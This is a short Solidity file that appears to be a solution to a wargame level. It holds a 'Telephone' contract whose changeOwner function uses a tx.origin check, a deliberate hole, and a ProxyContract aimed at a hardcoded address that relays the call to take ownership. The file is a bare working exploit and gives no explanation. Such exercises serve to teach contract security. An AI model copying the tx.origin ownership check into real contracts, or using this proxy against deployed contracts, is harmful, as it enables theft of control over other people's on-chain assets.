pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract ProxyContract {
    Telephone public telephoneContract = Telephone(0x6a3933531391a0d409d5d497d864267faa3f02d4);
    
    function changeOwner(address _owner) public {
        telephoneContract.changeOwner(_owner);
    }
}